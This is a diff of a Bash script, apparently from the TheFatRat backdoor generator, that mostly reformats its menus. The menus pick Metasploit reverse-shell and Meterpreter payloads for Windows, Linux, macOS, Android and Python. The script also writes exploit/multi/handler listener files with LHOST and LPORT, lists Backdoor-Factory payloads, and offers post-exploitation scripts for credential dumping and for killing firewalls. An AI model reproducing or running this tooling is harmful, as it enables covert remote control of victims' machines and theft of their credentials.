+							echo "set PAYLOAD windows/shell/reverse_tcp" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/back-lst.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "3" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/back-lst.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "4" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/meterpreter/reverse_tcp_dns" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/back-lst.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "5" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/meterpreter/reverse_http" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/back-lst.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "6" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/meterpreter/reverse_https" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/back-lst.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+						else
+							echo -e $red "Invalid option"
+							echo ""
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							bkflst
+						fi
+				else
+					svf=$path/config/listeners/$fname.rc
+					rm -rf $fname >/dev/null 2>&1
+					echo ""
+					echo -e $orange "  +-------------------------------------------+"
+					echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
+					echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
+					echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
+					echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
+					echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
+					echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
+					echo -e $orange "  +-------------------------------------------+"
+					echo ""
+					echo -ne $okegreen "  Choose Payload :";tput sgr0
+					read pld
+					
+						if [ $pld == "1" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/shell_bind_tcp" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/$fname.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "2" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/shell/reverse_tcp" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/$fname.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "3" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/$fname.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "4" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/meterpreter/reverse_tcp_dns" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/$fname.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "5" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/meterpreter/reverse_http" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/$fname.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+							
+						elif [ $pld == "6" ]; then
+							echo "use exploit/multi/handler" > $svf
+							echo "set PAYLOAD windows/meterpreter/reverse_https" >> $svf
+							echo "set LHOST $yourip" >> $svf
+							echo "set LPORT $yourport" >> $svf
+							echo "exploit" >> $svf
+							echo -e $okegreen ""
+							echo "Configuration file saved to $list/$fname.rc"
+							read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							menu
+						else
+							echo -e $red "Invalid option"
+							echo ""
+								read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+							echo
+							clear
+							bkflst
+						fi
+				fi
+		;;
+		
+		n|no|No|NO)
+			echo -e $okegreen ""
+			read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+			echo
+			clear
+			menu
+		;;
+		
+		*)
+			clear
+			menu
+		;;
+	esac
 }
-# Function to create a listener for apk
-function crlst() {
-echo -e $okegreen "Do you want to create a listener for this configuration"
-echo -e $okegreen "to use in msfconsole in future ?"
-echo ""
-echo -ne $cyan "Choose y/n : "
-read sel
-case $sel in
-y|Y|Yes|yes|YES)
-echo ""
-echo -e $green "Write the name for this config . (ex : myratapk)"
-echo -ne "Filename : ";tput sgr0
-read fname
-if [ -z $fname ]
-then
-svf=$path/config/listeners/myratapk.rc
-rm -rf $svf >/dev/null 2>&1
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD $payload" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit -j" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/myratapk.rc"
-else
-svf=$path/config/listeners/$fname.rc
-rm -rf $svf >/dev/null 2>&1
-echo "use exploit/multi/handler" > $svf
-echo "set PAYLOAD $payload" >> $svf
-echo "set LHOST $yourip" >> $svf
-echo "set LPORT $yourport" >> $svf
-echo "exploit -j" >> $svf
-echo -e $okegreen ""
-echo "Configuration file saved to $list/$fname.rc"
-fi
-echo -e $okegreen ""
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-;;
-n|no|No|NO)
-echo -e $okegreen ""
-read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
-echo
-clear
-menu
-;;
-*)
-clear
-menu
-;;
-esac
+
+# Function to Create a Listener For APK
+function crlst(){
+	echo -e $okegreen "Do you want to create a listener for this configuration"
+	echo -e $okegreen "to use in msfconsole in future ?"
+	echo ""
+	echo -ne $cyan "Choose y/n : "
+	read sel
+	case $sel in
+		y|Y|Yes|yes|YES)
+			echo ""
+			echo -e $green "Write the name for this config . (ex : myratapk)"
+			echo -ne "Filename : ";tput sgr0
+			read fname
+				if [ -z $fname ]; then
+					svf=$path/config/listeners/myratapk.rc
+					rm -rf $svf >/dev/null 2>&1
+					echo "use exploit/multi/handler" > $svf
+					echo "set PAYLOAD $payload" >> $svf
+					echo "set LHOST $yourip" >> $svf
+					echo "set LPORT $yourport" >> $svf
+					echo "exploit -j" >> $svf
+					echo -e $okegreen ""
+					echo "Configuration file saved to $list/myratapk.rc"
+				else
+				
+					svf=$path/config/listeners/$fname.rc
+					rm -rf $svf >/dev/null 2>&1
+					echo "use exploit/multi/handler" > $svf
+					echo "set PAYLOAD $payload" >> $svf
+					echo "set LHOST $yourip" >> $svf
+					echo "set LPORT $yourport" >> $svf
+					echo "exploit -j" >> $svf
+					echo -e $okegreen ""
+					echo "Configuration file saved to $list/$fname.rc"
+				fi
+	echo -e $okegreen ""
+	read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+	echo
+	clear
+	menu
+		;;
+		
+		n|no|No|NO)
+			echo -e $okegreen ""
+			read -rsp $'Press [ENTER] key to return to fatrat menu\n' -n 1 key
+			echo
+			clear
+			menu
+		;;
+		
+		*)
+			clear
+			menu
+		;;
+	esac
 }
-#Post exploit menu selection
-function postexp() {
-echo ""
-echo -e $orange "  +------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow sysinfo.rc$orange                   |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow fast_migrate.rc$orange              |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow cred_dump.rc$orange                 |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow gather.rc$orange                    |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow auto_migrate+killfirewall.rc$orange |"
-echo -e $orange "  +------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Post Exploitation Module : ";tput sgr0
-read pemd
-case $pemd in
-1)
-pe="$path/postexploit/sysinfo.rc"
-;;
-2)
-pe="$path/postexploit/fast_migrate.rc"
-;;
-3)
-pe="$path/postexploit/cred_dump.rc"
-;;
-4)
-pe="$path/postexploit/gather.rc"
-;;
-5)
-pe="$path/postexploit/auto_migrate+killfirewall.rc"
-;;
-*)
-postexp
-;;
-esac
+
+#Post Exploit Menu Selection
+function postexp(){
+	echo ""
+	echo -e $orange "  +------------------------------------+"
+	echo -e $orange "  |$white [$okegreen 1$white ]$yellow sysinfo.rc$orange                   |"
+	echo -e $orange "  |$white [$okegreen 2$white ]$yellow fast_migrate.rc$orange              |"
+	echo -e $orange "  |$white [$okegreen 3$white ]$yellow cred_dump.rc$orange                 |"
+	echo -e $orange "  |$white [$okegreen 4$white ]$yellow gather.rc$orange                    |"
+	echo -e $orange "  |$white [$okegreen 5$white ]$yellow auto_migrate+killfirewall.rc$orange |"
+	echo -e $orange "  +------------------------------------+"
+	echo ""
+	echo -ne $okegreen "  Choose Post Exploitation Module : ";tput sgr0
+	read pemd
+		case $pemd in
+			1)
+				pe="$path/postexploit/sysinfo.rc"
+			;;
+			
+			2)
+				pe="$path/postexploit/fast_migrate.rc"
+			;;
+			
+			3)
+				pe="$path/postexploit/cred_dump.rc"
+			;;
+			
+			4)
+				pe="$path/postexploit/gather.rc"
+			;;
+
+			5)
+				pe="$path/postexploit/auto_migrate+killfirewall.rc"
+			;;
+			
+			*)
+				postexp
+			;;
+		esac
 }
-# Backdoor-factory menu payload selection
-function pldbkf() {
-echo ""
-echo -e $orange "  +--------------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow cave_miner_inline$orange                    |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow iat_reverse_tcp_inline$orange               |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow iat_reverse_tcp_inline_threaded$orange      |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow iat_reverse_tcp_stager_threaded$orange      |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow iat_user_supplied_shellcode_threaded$orange |"
-echo -e $orange "  |$white [$okegreen 6$white ]$yellow meterpreter_reverse_https_threaded$orange   |"
-echo -e $orange "  |$white [$okegreen 7$white ]$yellow reverse_shell_tcp_inline$orange             |"
-echo -e $orange "  |$white [$okegreen 8$white ]$yellow reverse_tcp_stager_threaded$orange          |"
-echo -e $orange "  |$white [$okegreen 9$white ]$yellow user_supplied_shellcode_threaded$orange     |"
-echo -e $orange "  +--------------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Payload : ";tput sgr0
-read pld
-case $pld in
-1)
-payload="cave_miner_inline"
-;;
-2)
-payload="iat_reverse_tcp_inline"
-;;
-3)
-payload="iat_reverse_tcp_inline_threaded"
-;;
-4)
-payload="iat_reverse_tcp_stager_threaded"
-;;
-5)
-payload="iat_user_supplied_shellcode_threaded"
-;;
-6)
-payload="meterpreter_reverse_https_threaded"
-;;
-7)
-payload="reverse_shell_tcp_inline"
-;;
-8)
-payload="reverse_tcp_stager_threaded"
-;;
-9)
-payload="user_supplied_shellcode_threaded"
-;;
-*)
-echo ""
-echo -ne $red "Wrong input , choose between 1 and 9 :"
-pldbkf
-;;
-esac
+
+# Backdoor-Factory Menu Payload Selection
+# Reference : https://github.com/secretsquirrel/the-backdoor-factory
+
+function pldbkf(){
+	echo ""
+	echo -e $orange "  +--------------------------------------------+"
+	echo -e $orange "  |$white [$okegreen 1$white ]$yellow cave_miner_inline$orange                    |"
+	echo -e $orange "  |$white [$okegreen 2$white ]$yellow iat_reverse_tcp_inline$orange               |"
+	echo -e $orange "  |$white [$okegreen 3$white ]$yellow iat_reverse_tcp_inline_threaded$orange      |"
+	echo -e $orange "  |$white [$okegreen 4$white ]$yellow iat_reverse_tcp_stager_threaded$orange      |"
+	echo -e $orange "  |$white [$okegreen 5$white ]$yellow iat_user_supplied_shellcode_threaded$orange |"
+	echo -e $orange "  |$white [$okegreen 6$white ]$yellow meterpreter_reverse_https_threaded$orange   |"
+	echo -e $orange "  |$white [$okegreen 7$white ]$yellow reverse_shell_tcp_inline$orange             |"
+	echo -e $orange "  |$white [$okegreen 8$white ]$yellow reverse_tcp_stager_threaded$orange          |"
+	echo -e $orange "  |$white [$okegreen 9$white ]$yellow user_supplied_shellcode_threaded$orange     |"
+	echo -e $orange "  +--------------------------------------------+"
+	echo ""
+	echo -ne $okegreen "  Choose Payload : ";tput sgr0
+	read pld
+		case $pld in
+			1)
+				payload="cave_miner_inline"
+			;;
+
+			2)
+				payload="iat_reverse_tcp_inline"
+			;;
+
+			3)
+				payload="iat_reverse_tcp_inline_threaded"
+			;;
+
+			4)
+				payload="iat_reverse_tcp_stager_threaded"
+			;;
+			
+			5)
+				payload="iat_user_supplied_shellcode_threaded"
+			;;
+
+			6)
+				payload="meterpreter_reverse_https_threaded"
+			;;
+			
+			7)
+				payload="reverse_shell_tcp_inline"
+			;;
+			
+			8)
+				payload="reverse_tcp_stager_threaded"
+			;;
+
+			9)
+				payload="user_supplied_shellcode_threaded"
+			;;
+			
+			*)
+				echo ""
+				echo -ne $red "Wrong input , choose between 1 and 9 :"
+				pldbkf
+			;;
+	esac
 }
-# Linux msfvenom payload selection
-function pldlnx () {
-echo ""
-echo -e $orange "  +-----------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow linux/ppc/shell_reverse_tcp$orange       |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow linux/x86/shell_reverse_tcp$orange       |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow linux/x86/meterpreter/reverse_tcp$orange |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow osx/armle/shell_reverse_tcp$orange       |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow osx/ppc/shell_reverse_tcp$orange         |"
-echo -e $orange "  |$white [$okegreen 6$white ]$yellow bsd/x86/shell/reverse_tcp$orange         |"
-echo -e $orange "  |$white [$okegreen 7$white ]$yellow solaris/x86/shell_reverse_tcp$orange     |"
-echo -e $orange "  +-----------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Payload : ";tput sgr0
-read pld
-case $pld in
-1)
-payload="linux/ppc/shell_reverse_tcp"
-;;
-2)
-payload="linux/x86/shell_reverse_tcp"
-;;
-3)
-payload="linux/x86/meterpreter/reverse_tcp"
-;;
-4)
-payload="osx/armle/shell_reverse_tcp"
-;;
-5)
-payload="osx/ppc/shell_reverse_tcp"
-;;
-6)
-payload="bsd/x86/shell/reverse_tcp"
-;;
-7)
-payload="solaris/x86/shell_reverse_tcp"
-;;
-*)
-echo ""
-echo -ne $red "Wrong input , choose between 1 and 7 :"
-pldlnx
-;;
-esac
+
+# Linux MSFVENOM Payload Selection
+# Manual Generation : https://www.offensive-security.com/metasploit-unleashed/msfvenom/
+
+function pldlnx(){
+	echo ""
+	echo -e $orange "  +-----------------------------------------+"
+	echo -e $orange "  |$white [$okegreen 1$white ]$yellow linux/ppc/shell_reverse_tcp$orange       |"
+	echo -e $orange "  |$white [$okegreen 2$white ]$yellow linux/x86/shell_reverse_tcp$orange       |"
+	echo -e $orange "  |$white [$okegreen 3$white ]$yellow linux/x86/meterpreter/reverse_tcp$orange |"
+	echo -e $orange "  |$white [$okegreen 4$white ]$yellow osx/armle/shell_reverse_tcp$orange       |"
+	echo -e $orange "  |$white [$okegreen 5$white ]$yellow osx/ppc/shell_reverse_tcp$orange         |"
+	echo -e $orange "  |$white [$okegreen 6$white ]$yellow bsd/x86/shell/reverse_tcp$orange         |"
+	echo -e $orange "  |$white [$okegreen 7$white ]$yellow solaris/x86/shell_reverse_tcp$orange     |"
+	echo -e $orange "  +-----------------------------------------+"
+	echo ""
+	echo -ne $okegreen "  Choose Payload : ";tput sgr0
+	read pld
+		case $pld in
+			1)
+				payload="linux/ppc/shell_reverse_tcp"
+			;;
+
+			2)
+				payload="linux/x86/shell_reverse_tcp"
+			;;
+
+			3)
+				payload="linux/x86/meterpreter/reverse_tcp"
+			;;
+			
+			4)
+				payload="osx/armle/shell_reverse_tcp"
+			;;
+
+			5)
+				payload="osx/ppc/shell_reverse_tcp"
+			;;
+			
+			6)
+				payload="bsd/x86/shell/reverse_tcp"
+			;;
+
+			7)
+				payload="solaris/x86/shell_reverse_tcp"
+			;;
+			
+			*)
+				echo ""
+				echo -ne $red "Wrong input , choose between 1 and 7 :"
+				pldlnx
+			;;
+	esac
 }
-# Windows msfvenom payload selection
-function pldwin () {
-echo ""
-echo -e $orange "  +-------------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
-echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
-echo -e $orange "  +-------------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Payload :";tput sgr0
-read pld
-case $pld in
-1)
-payload="windows/shell_bind_tcp"
-;;
-2)
-payload="windows/shell/reverse_tcp"
-;;
-3)
-payload="windows/meterpreter/reverse_tcp"
-;;
-4)
-payload="windows/meterpreter/reverse_tcp_dns"
-;;
-5)
-payload="windows/meterpreter/reverse_http"
-;;
-6)
-payload="windows/meterpreter/reverse_https"
-;;
-*)
-echo ""
-echo -e $red "Wrong input , choose between 1 and 6"
-pldwin
-;;
-esac
+
+# Windows MSFVENOM Payload Selection
+# Manual Generation : https://www.offensive-security.com/metasploit-unleashed/msfvenom/
+
+function pldwin(){
+	echo ""
+	echo -e $orange "  +-------------------------------------------+"
+	echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
+	echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
+	echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
+	echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
+	echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
+	echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
+	echo -e $orange "  +-------------------------------------------+"
+	echo ""
+	echo -ne $okegreen "  Choose Payload :";tput sgr0
+	read pld
+		case $pld in
+			1)
+				payload="windows/shell_bind_tcp"
+			;;
+			
+			2)
+				payload="windows/shell/reverse_tcp"
+			;;
+
+			3)
+				payload="windows/meterpreter/reverse_tcp"
+			;;
+
+			4)
+				payload="windows/meterpreter/reverse_tcp_dns"
+			;;
+			
+			5)
+				payload="windows/meterpreter/reverse_http"
+			;;
+
+			6)
+				payload="windows/meterpreter/reverse_https"
+			;;
+			
+			*)
+				echo ""
+				echo -e $red "Wrong input , choose between 1 and 6"
+				pldwin
+			;;
+	esac
 }
+
 # Android msfvenom payload selection
 function pldand () {
-echo ""
-echo -e $orange "  +-------------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow android/meterpreter/reverse_http$orange    |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow android/meterpreter/reverse_https$orange   |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow android/meterpreter/reverse_tcp$orange     |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow android/shell/reverse_http$orange          |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow android/shell/reverse_https$orange         |"
-echo -e $orange "  |$white [$okegreen 6$white ]$yellow android/shell/reverse_tcp$orange           |"
-echo -e $orange "  +-------------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Payload : ";tput sgr0
-read pld
-case $pld in
-1)
-payload="android/meterpreter/reverse_http"
-;;
-2)
-payload="android/meterpreter/reverse_https"
-;;
-3)
-payload="android/meterpreter/reverse_tcp"
-;;
-4)
-payload="android/shell/reverse_http"
-;;
-5)
-payload="android/shell/reverse_https"
-;;
-6)
-payload="android/shell/reverse_tcp"
-;;
-*)
-echo ""
-echo -e $red "Wrong input , choose between 1 and 6"
-pldand
-;;
-esac
+	echo ""
+	echo -e $orange "  +-------------------------------------------+"
+	echo -e $orange "  |$white [$okegreen 1$white ]$yellow android/meterpreter/reverse_http$orange    |"
+	echo -e $orange "  |$white [$okegreen 2$white ]$yellow android/meterpreter/reverse_https$orange   |"
+	echo -e $orange "  |$white [$okegreen 3$white ]$yellow android/meterpreter/reverse_tcp$orange     |"
+	echo -e $orange "  |$white [$okegreen 4$white ]$yellow android/shell/reverse_http$orange          |"
+	echo -e $orange "  |$white [$okegreen 5$white ]$yellow android/shell/reverse_https$orange         |"
+	echo -e $orange "  |$white [$okegreen 6$white ]$yellow android/shell/reverse_tcp$orange           |"
+	echo -e $orange "  +-------------------------------------------+"
+	echo ""
+	echo -ne $okegreen "  Choose Payload : ";tput sgr0
+	read pld
+		case $pld in
+			1)
+				payload="android/meterpreter/reverse_http"
+			;;
+
+			2)
+				payload="android/meterpreter/reverse_https"
+			;;
+
+			3)
+				payload="android/meterpreter/reverse_tcp"
+			;;
+			
+			4)
+				payload="android/shell/reverse_http"
+			;;
+
+			5)
+				payload="android/shell/reverse_https"
+			;;
+			
+			6)
+				payload="android/shell/reverse_tcp"
+			;;
+			
+			*)
+				echo ""
+				echo -e $red "Wrong input , choose between 1 and 6"
+				pldand
+			;;
+	esac
 }
-# Mac msfvenom payload selection
-function pldmac() {
-echo ""
-echo -e $orange "  +--------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow python/meterpreter/reverse_tcp$orange |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow generic/shell_reverse_tcp$orange      |"
-echo -e $orange "  +--------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Payload : ";tput sgr0
-read pld
-case $pld in
-1)
-payload="python/meterpreter/reverse_tcp"
-;;
-2)
-payload="generic/shell_reverse_tcp"
-;;
-*)
-echo ""
-echo -e $red "Wrong input , choose between 1 and 2"
-pldmac
-;;
-esac
+
+# MAC MSFVENOM Payload Selection
+function pldmac(){
+	echo ""
+	echo -e $orange "  +--------------------------------------+"
+	echo -e $orange "  |$white [$okegreen 1$white ]$yellow python/meterpreter/reverse_tcp$orange |"
+	echo -e $orange "  |$white [$okegreen 2$white ]$yellow generic/shell_reverse_tcp$orange      |"
+	echo -e $orange "  +--------------------------------------+"
+	echo ""
+	echo -ne $okegreen "  Choose Payload : ";tput sgr0
+	read pld
+		case $pld in
+			1)
+				payload="python/meterpreter/reverse_tcp"
+			;;
+			
+			2)
+				payload="generic/shell_reverse_tcp"
+			;;
+			
+			*)
+				echo ""
+				echo -e $red "Wrong input , choose between 1 and 2"
+				pldmac
+			;;
+	esac
 }
+
 # Linux multi msfvenom payload selection
 function pldmul() {
-echo ""
-echo -e $orange "  +------------------------------------------+"
-echo -e $orange "  |$white [$okegreen 1$white ]$yellow python/meterpreter/reverse_tcp$orange     |"
-echo -e $orange "  |$white [$okegreen 2$white ]$yellow python/meterpreter/reverse_http$orange    |"
-echo -e $orange "  |$white [$okegreen 3$white ]$yellow python/meterpreter/reverse_https$orange   |"
-echo -e $orange "  |$white [$okegreen 4$white ]$yellow python/meterpreter_reverse_http$orange    |"
-echo -e $orange "  |$white [$okegreen 5$white ]$yellow python/meterpreter_reverse_https$orange   |"
-echo -e $orange "  |$white [$okegreen 6$white ]$yellow python/shell_reverse_tcp$orange           |"
-echo -e $orange "  |$white [$okegreen 7$white ]$yellow python/meterpreter/reverse_tcp_ssl$orange |"
-echo -e $orange "  +------------------------------------------+"
-echo ""
-echo -ne $okegreen "  Choose Payload : ";tput sgr0
-read pld
-case $pld in
-1)
-payload="python/meterpreter/reverse_tcp"
-;;
-2)
-payload="python/meterpreter/reverse_http"
-;;
-3)
-payload="python/meterpreter/reverse_https"
-;;
-4)
-payload="python/meterpreter_reverse_http"
-;;
-5)
-payload="python/meterpreter_reverse_https"
-;;
-6)
-payload="python/shell_reverse_tcp"
-;;
-7)
-payload="python/meterpreter/reverse_tcp_ssl"
-;;
-*)
-echo ""
-echo -e $red "Wrong input , choose between 1 and 7"
-pldmul
-;;
-esac
+	echo ""
+	echo -e $orange "  +------------------------------------------+"
+	echo -e $orange "  |$white [$okegreen 1$white ]$yellow python/meterpreter/reverse_tcp$orange     |"
+	echo -e $orange "  |$white [$okegreen 2$white ]$yellow python/meterpreter/reverse_http$orange    |"
+	echo -e $orange "  |$white [$okegreen 3$white ]$yellow python/meterpreter/reverse_https$orange   |"
+	echo -e $orange "  |$white [$okegreen 4$white ]$yellow python/meterpreter_reverse_http$orange    |"
+	echo -e $orange "  |$white [$okegreen 5$white ]$yellow python/meterpreter_reverse_https$orange   |"
+	echo -e $orange "  |$white [$okegreen 6$white ]$yellow python/shell_reverse_tcp$orange           |"
+	echo -e $orange "  |$white [$okegreen 7$white ]$yellow python/meterpreter/reverse_tcp_ssl$orange |"
+	echo -e $orange "  +------------------------------------------+"
+	echo ""
+	echo -ne $okegreen "  Choose Payload : ";tput sgr0
+	read pld
+		case $pld in
+			1)
+				payload="python/meterpreter/reverse_tcp"
+			;;
+			
+			2)
+				payload="python/meterpreter/reverse_http"
+			;;
+			
+			3)
+				payload="python/meterpreter/reverse_https"
+			;;
+			
+			4)
+				payload="python/meterpreter_reverse_http"
+			;;
+
+			5)
+				payload="python/meterpreter_reverse_https"
+			;;
+			
+			6)
+				payload="python/shell_reverse_tcp"
+			;;
+			
+			7)
+				payload="python/meterpreter/reverse_tcp_ssl"
+			;;
+			
+			*)
+				echo ""
+				echo -e $red "Wrong input , choose between 1 and 7"
+				pldmul
+			;;
+	esac
 }
 
-#Microsploit log file
-msploitr ()
-{
+#Microsploit Log File
+msploitr(){
 rm -rf $msploit >/dev/null 2>&1
-touch $msploit
-echo "**********************************************" > $msploit
-echo "*           Microsploit    Log               *" >> $msploit
-echo "**********************************************" >> $msploit
-echo "             Metepreter Data                  " >> $msploit
-echo "----------------------------------------------" >> $msploit
+	touch $msploit
+	echo "**********************************************" > $msploit
+	echo "*           Microsploit    Log               *" >> $msploit
+	echo "**********************************************" >> $msploit
+	echo "             Metepreter Data                  " >> $msploit
+	echo "----------------------------------------------" >> $msploit
 cat $meterp | while read LINE
 do
-echo $LINE >> $msploit
+	echo $LINE >> $msploit
 done
-echo "----------------------------------------------" >> $msploit
-echo "              Xterm Output                    " >> $msploit
-echo "----------------------------------------------" >> $msploit
+	echo "----------------------------------------------" >> $msploit
+	echo "              Xterm Output                    " >> $msploit
+	echo "----------------------------------------------" >> $msploit
 
 }
 
-#Checking if user is root
+#Checking if User is Root
 [[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
-resize -s 33 84 > /dev/null
+	resize -s 33 84 > /dev/null
 clear
 
-#check if tools path config file exists before proceeding
-
-if [ -f "$file" ]
-then
-#config file exists , then load tools paths to specific variables
-msfconsole=`sed -n 14p $file`
-msfvenom=`sed -n 15p $file`
-backdoor=`sed -n 16p $file`
-searchsploit=`sed -n 17p $file`
-aapt=`sed -n 11p $file`
-apktool=`sed -n 12p $file`
-keytool=`sed -n 7p $file`
-sign=`sed -n 5p $file`
-dx=`sed -n 10p $file`
-else
-#config file does not exist
-	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
-exit 1
-fi
 
 #If default Lhost & Lport configuration file exists then load their values to variables
-if [ -f "$defcon" ]
-then
-yourip=`sed -n 1p $defcon`
